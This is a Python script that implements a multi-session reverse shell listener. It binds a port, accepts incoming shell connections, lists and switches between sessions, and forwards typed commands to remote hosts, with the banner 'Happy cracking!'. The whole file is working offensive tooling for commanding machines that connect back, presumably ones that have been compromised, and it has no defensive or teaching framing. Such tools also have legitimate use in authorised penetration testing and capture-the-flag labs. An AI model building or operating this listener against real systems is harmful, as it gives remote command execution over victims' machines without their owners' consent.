#!/usr/bin/env python3
# Reverse shell listener
# 
# @author Sebastian Ko sebastian.ko.dv@gmail.com
import sys
import time
import errno
import socket
import threading

def main():
    print("===========================")
    print(" Reverse Shell listener")
    print("===========================")
    port = 9000

    if len(sys.argv) <= 1:
        print("Usage: reverseshell-listener.py <port>")
        sys.exit()
    else:
        port = int(sys.argv[1])

    conntionpool = connectionThread("", port)
    conntionpool.start()

    connectedSession = 1
    while True:
        try:

            if connectedSession != 0:
                sessionMatch = False
                for client in conntionpool.clients:
                    if not client.quit and client.getSessionId() == connectedSession:
                        sessionMatch = True
                        client.interact()
                        connectedSession = 0
                
                if not sessionMatch and len(conntionpool.clients) > 1:
                    print("[-] No matched session or session has been closed")
                    connectedSession = 0
                elif len(conntionpool.clients) == 0:
                    # Wait until the connection comes on first time
                    connectedSession = 1
            elif len(conntionpool.clients) > 0:
                command = input("listener> ")
                connectedSession = commandHandler(command, conntionpool)
        except KeyboardInterrupt:
            sys.exit()

def commandHandler(cmd, conntionpool):
    connectedSession = 0
    try:
        
        command = cmd.split(' ')
        if command[0] == "help":
            print("sessions \t- List sessions")
            print("session <num> \t- Get into session by ID")
        elif command[0] == "sessions":
            print("---------------------->")
            for client in conntionpool.clients:
                print(client.status())
            print("<----------------------")
        elif command[0] == "session":
            connectedSession = int(command[1])
    finally:
        return connectedSession
    

def prompt(message):
    answer = ""
    while(answer != "Y" and answer != "N"):
        answer = input(message + " (Y/N): ")
        answer = answer.upper()
    return answer == "Y"



class connectionThread(threading.Thread):
    def __init__(self, host, port):
        super(connectionThread, self).__init__()
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.s.bind((host,port))
            self.s.listen(1024)
            print("[+] Listening on <%s:%d>" % (self.s.getsockname()[0], port))
        except socket.error as e:
            print("[-] Failed to create socket")
            print(e)
            sys.exit()
        self.clients = []

    def run(self):
        sessionId = 1
        while True:
            conn, address = self.s.accept()
            sock = Socket(conn, address)
            sock.listen(sessionId)
            shell = Shell(sock)
            self.clients.append(shell)
            print('[+] Client connected: {0}'.format(address[0]))

            # sessionId++
            sessionId = sessionId + 1


class Socket:
    addr = None
    port = None
    conn = None
    sessionId = None
    closed = False

    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        

    def listen(self, sessionId):
        try:
            self.conn.setblocking(False)
            self.sessionId = sessionId
            print("[+] Got connection from <%s:%d>, Session ID: %d" % (self.addr[0], self.addr[1], self.sessionId))
        except socket.timeout:
            print("[-] Error: Connection timed out")
            self.close()
        except socket.error as err:
            print("[-] Error: Connection lost")
            print(err)
            self.close()

    def send(self, message, chunksize = 2048):
        try:
            for chunk in self._chunks(message, chunksize):
                self.conn.send(chunk)
            time.sleep(0.5)
        except socket.timeout:
            print("[-] Error: Connection timed out")
            self.close()
        except socket.error as err:
            print("[-] Error: Send error")
            print(err)
            self.close()


    def receive(self, chunksize = 2048):
        output = ""

        # Receive socket data
        try:
            while True:
                data = self.conn.recv(chunksize).decode()
                output += data
                sys.stdout.write(str(data))
                if not data: break
        except socket.timeout:
            print("[-] Error: Connection timed out")
            self.close()
        except socket.error as e:
            err = e.args[0]
            if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
                return output
            else:
                print("[-] Error: Connection lost")
                self.close()

    def close(self):
        try:
            self.closed = True
            self.conn.close()
        except socket.error as e:
            print("[-] Error: " + str(e))

    def isClosed(self):
        return self.closed

    def _chunks(self, lst, chunksize):
        for i in range(0, len(lst), chunksize):
            yield lst[i:i+chunksize]



class Shell:
    sock = None
    quit = False
    background = False
    backgroundCommand = 'rev-bg'

    def __init__(self, sock):
        self.sock = sock

    def interact(self):
        time.sleep(0.1)
        print("[+] Interact with Session ID: %d" % (self.sock.sessionId))
        print("[!] Type '%s' to background the current session" % (self.backgroundCommand))
        print("[+] Happy cracking!")
        # Reset parameter
        self.background = False
        # Loop for command
        while True:
            self.output()
            self.input()
            if self.quit:
                print("[+] Shell closeing..")
                self.sock.close()
                break
            elif self.background:
                print("[+] Background current session %d" % (self.sock.sessionId))
                break
            # Final check
            elif self.sock.isClosed():
                print("[+] Session closed..")
                self.quit = True
                break

    def output(self):
        self.sock.receive()

    def input(self):
        try:
            command = input()

            if command == self.backgroundCommand:
                self.background = True
                return

            # Send the command
            self.sock.send((command + "\n").encode())

        # Catch ^C
        except KeyboardInterrupt:
            print("")
            res = prompt("Do you really want to quit?")
            if (res):
                self.quit = True
                print("")
            else:
                self.sock.send(("\003\n").encode())

    def status(self):
        return ("Session ID: [%d], Connection <%s:%d>, Seesion killed? - %s " 
            % (self.sock.sessionId, self.sock.addr[0], self.sock.addr[1], self.quit))

    def getSessionId(self):
        return self.sock.sessionId


# Call main 
if __name__ == "__main__":
    main()